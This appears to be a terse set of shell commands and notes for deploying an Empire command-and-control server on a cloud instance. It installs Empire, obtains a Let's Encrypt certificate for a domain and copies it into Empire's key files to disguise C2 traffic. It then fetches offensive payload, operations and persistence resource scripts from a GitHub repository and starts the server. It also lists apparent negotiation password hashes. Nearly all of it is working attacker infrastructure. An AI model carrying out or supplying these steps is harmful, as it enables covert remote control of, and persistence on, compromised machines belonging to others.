# create instance
# download key
# enable inbound port 80 and 443
# point domain name to instance IP address

chmod 600 .ssh/key
ssh -i .ssh/key ubuntu@ip

sudo apt-get update && sudo apt-get upgrade -y

# install Empire
sudo apt-get install git -y
git clone https://github.com/EmpireProject/Empire.git
cd Empire/setup && sudo ./install.sh
 
# ENTER server negotiation password: 	uco  -->  19303321ad0bf9f22e7545815d3a87b9
										sel  -->  fe5d01b2dc7564c3b87d969e8185501b

# Create certificate
sudo apt-get install software-properties-common -y
sudo add-apt-repository ppa:deadsnakes/ppa
sudo add-apt-repository ppa:certbot/certbot
sudo apt-get update
sudo apt-get install python-certbot-apache -y 
sudo certbot --apache
# ENTER email address
# A to agree
# N for No
# Enter domain name
# 1 - Make no further changes


# Configure certs
cd ~
cp Empire/data/empire-priv.key Empire/data/empire-priv.key.old
cp Empire/data/empire-chain.pem Empire/data/empire-chain.pem.old
sudo cp /etc/letsencrypt/live/sadeyedlady.com/privkey.pem Empire/data/empire-priv.key
sudo cp /etc/letsencrypt/live/sadeyedlady.com/fullchain.pem Empire/data/empire-chain.pem
sudo service apache2 stop


# Get resource files
wget https://raw.githubusercontent.com/sherobbedmyboots/malkoo/master/Offense/payload.rc
wget https://raw.githubusercontent.com/sherobbedmyboots/malkoo/master/Offense/operations.rc
wget https://raw.githubusercontent.com/sherobbedmyboots/malkoo/master/Offense/persistence.rc


cd Empire
sudo ./empire

